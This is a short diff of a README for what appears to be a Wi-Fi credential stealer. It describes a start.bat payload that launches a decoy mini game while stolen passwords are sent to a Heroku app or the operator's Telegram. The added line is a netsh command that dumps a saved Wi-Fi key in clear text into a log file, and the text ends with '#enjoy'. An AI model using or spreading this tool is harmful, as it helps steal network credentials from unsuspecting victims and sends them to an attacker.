@@ -22,6 +22,8 @@ now you can see the password at [yourapp].heroku.com or it's sent to your telegr
 this include a mini game that launches when start.bat is opened.  
 you must change the start.bat in the payload    
 
-netsh wlan show profile "victim wifi name here" key=clear > bin\log.txt  
+```shell
+netsh wlan show profile router1 key=clear | findstr "Key Content" > bin\log.txt
+```
 
 #enjoy
